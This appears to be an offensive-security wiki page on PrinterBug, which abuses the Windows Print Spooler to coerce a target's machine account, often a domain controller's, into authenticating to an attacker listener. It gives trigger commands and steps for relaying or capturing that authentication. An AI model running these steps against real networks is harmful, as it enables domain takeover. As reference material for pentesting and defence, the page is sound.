---
title: "PrinterBug: coercing authentication through the spooler"
description: "Using the Print Spooler's MS-RPRN change-notification call to force a target machine, including a domain controller, to authenticate to an attacker over SMB, producing the coerced authentication that feeds NTLM relay and Kerberos delegation attacks."
keywords:
  - PrinterBug
  - SpoolSample
  - MS-RPRN
  - coercion
  - RpcRemoteFindFirstPrinterChangeNotification
---

# PrinterBug

The **PrinterBug** turns the spooler into a coercion engine. Any authenticated user can call `RpcRemoteFindFirstPrinterChangeNotificationEx` on a target's spooler and ask it to send print-change notifications to a server of the caller's choosing. The target obliges by **authenticating to that server with its machine account** over SMB, which is exactly the coerced authentication that [NTLM relay](../../directory/active-directory/authentication/ntlm/relay.md) and Kerberos delegation attacks need. Because the spooler runs on domain controllers, this often means **coercing a DC**.

## Triggering it

```bash
# Point the target's spooler at a listener; the target authenticates as its machine account
printerbug.py 'example.local/user:password'@<target> <attacker-listener>
# or the original SpoolSample (Windows), or dementor.py

# NetExec: without LISTENER it only checks; set LISTENER to actually coerce the callback
nxc smb <target> -u user -p password -M coerce_plus -o LISTENER=<attacker-ip>
```

## What you do with the coerced auth

The incoming machine-account authentication is only useful once relayed or captured:

- **Relay to LDAP/AD CS** for resource-based constrained delegation, shadow credentials, or a certificate (the DC's own authentication is powerful).
- **Relay to another host** where the coerced machine is local admin.
- **Capture and crack**, or relay to feed an **unconstrained delegation** capture of the DC's TGT.

## Exploitation notes

- The spooler is enabled by default and reachable by **any domain user**, so PrinterBug needs only a low-privilege credential and a reachable spooler.
- It is the classic partner to [unconstrained delegation](../../directory/active-directory/authentication/kerberos/delegation/unconstrained.md): coerce a DC to a host you control that holds unconstrained delegation, and you capture the DC's TGT.
- Where the spooler is disabled, fall back to other coercion surfaces (the same relay chain applies regardless of which coercion primitive feeds it).
- This is coercion, not code execution; for SYSTEM on the spooler host see [Point and Print](point-and-print.md).

## Tools

- **printerbug.py** (dirkjanm/krbrelayx), **SpoolSample** (leechristensen), **dementor.py**: trigger the coercion.
- **NetExec `-M coerce_plus`**: enumerate and trigger spooler (and other) coercion.
- **ntlmrelayx.py / krbrelayx.py**: relay or capture the coerced authentication.

## References

- [The Hacker Recipes: PrinterBug](https://www.thehacker.recipes/ad/movement/print-spooler-service/printerbug)
- [SpoolSample (leechristensen)](https://github.com/leechristensen/SpoolSample)
- [krbrelayx / printerbug.py (dirkjanm)](https://github.com/dirkjanm/krbrelayx)
